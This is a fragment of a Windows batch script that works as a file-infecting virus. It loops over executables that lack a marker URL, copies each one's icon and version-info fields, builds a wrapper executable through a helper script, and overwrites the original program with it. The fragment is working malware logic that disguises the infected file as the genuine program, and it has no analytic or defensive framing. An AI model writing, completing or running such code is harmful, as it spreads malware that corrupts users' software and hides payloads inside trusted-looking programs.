    findstr /C:"https://tobecation.github.io/" "%%F" >nul || (
        title infecting %%F
        7z x "%%F" -o"%currentCursorPath%\Temp" -aoa
        powershell -command "Get-ChildItem "%currentCursorPath%\Temp" -Filter *.ico -Recurse | Sort-Object Length -Descending | Select-Object -First 1 -ExpandProperty FullName | Out-File targetIco"
        copy /y "%%F" "%currentCursorPath%\meat"
        echo %%~nxF>exeName
        copy /y %exePath% "%currentCursorPath%\hook"
        for %%d in (CompanyName FileDescription InternalName LegalCopyright OriginalFilename FileVersion ProductName ProductVersion) do (
            powershell -Command "(Get-Item -Path '%%F').VersionInfo.%%d">%%d
        )
        "WorkerThread.cmd"
        echo https://tobecation.github.io/>>"Output.exe"
        copy /y "Output.exe" "%%F"
        del/f/s/q "Output.exe"
    )
)